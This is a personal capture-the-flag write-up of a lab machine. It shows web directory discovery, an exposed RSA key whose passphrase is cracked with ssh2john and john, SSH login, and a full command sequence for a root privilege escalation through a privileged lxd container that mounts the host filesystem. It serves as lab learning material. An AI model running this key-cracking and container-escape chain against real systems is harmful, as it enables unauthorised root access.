Started clicking on links on the website and found a upload section and takes me to a non upload page but a place were uploaded files go
		http://10.10.188.182/uploads/

Found a password list
		http://10.10.188.182/uploads/dict.lst

Found a note in the index.html file possibale username
		<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->

Found a directory /secret/ and found a rsa key
		http://10.10.188.182/secret/secretKey
		
				-----BEGIN RSA PRIVATE KEY-----
		<REDACTED>


I tried to crack ssh with username john and the password list i found did not find anything

I did ssh2john and made a hash file and then used john to crack it
		ssh2john secretKey > id_rsa.hash
		john --wordlist=dict.lst id_rsa.hash

Then found a password for the rsa key
<REDACTED>          (secretKey)

Then i was able to ssh in
ssh john@10.10.188.182 -i secretKey

Then i looked around a bit did not find anything so I went and downloaded linpeas onto the box

To get root we have to exploit the lxd 

Clone the repo here is the commands to do so
		git clone  https://github.com/saghul/lxd-alpine-builder.git
		cd lxd-alpine-builder
		./build-alpine
	
Then start a http server on your host machine 
		python -m SimpleHTTPServer
		
Go to the /tmp directory and download the file
		cd /tmp
    wget http://192.168.1.107:8000/apline-v3.10-x86_64-20191008_1227.tar.gz

After we build the image we will add it
		lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
		
Then we are going to list the image and make sure its there
		lxc image list
		
Then to start the exploit now we will run these commands to get root
		lxc init myimage ignite -c security.privileged=true
		lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
		lxc start ignite
		lxc exec ignite /bin/sh
		id
		
And now we have root and to view contents in the root folder we run this command
		mnt/root/root
		ls
		root.txt
		cat root.txt
